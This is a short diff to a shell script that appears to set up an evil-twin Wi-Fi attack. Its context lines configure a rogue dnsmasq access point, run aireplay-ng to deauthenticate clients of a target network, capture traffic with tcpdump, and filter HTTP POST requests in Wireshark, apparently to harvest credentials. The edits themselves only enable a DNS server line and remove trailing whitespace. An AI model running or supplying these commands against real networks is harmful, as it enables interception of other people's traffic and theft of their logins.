@@ -27,7 +27,7 @@ echo "interface=${listeningInterface}" > dnsmasq.conf
 echo "dhcp-range=192.168.1.10,192.168.1.100,12h" >> dnsmasq.conf
 echo "dhcp-option=6,8.8.8.8" >> dnsmasq.conf
 echo "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
-#echo "server=8.8.8.8" >> dnsmasq.conf
+echo "server=8.8.8.8" >> dnsmasq.conf
 echo "no-resolv" >> dnsmasq.conf
 
 sudo ip addr add 192.168.1.1/24 dev "${listeningInterface}"
@@ -48,5 +48,5 @@ sudo aireplay-ng -0 50 -a ${finalBSSID} ${deauthInterface} -D
 sleep 20
 sudo airmon-ng stop ${deauthInterface}
 
-sudo timeout 20 tcpdump -i ${listeningInterface} -w sniff.txt 
+sudo timeout 20 tcpdump -i ${listeningInterface} -w sniff.txt
 sudo wireshark -r sniff.txt -J "http.request.method == POST"
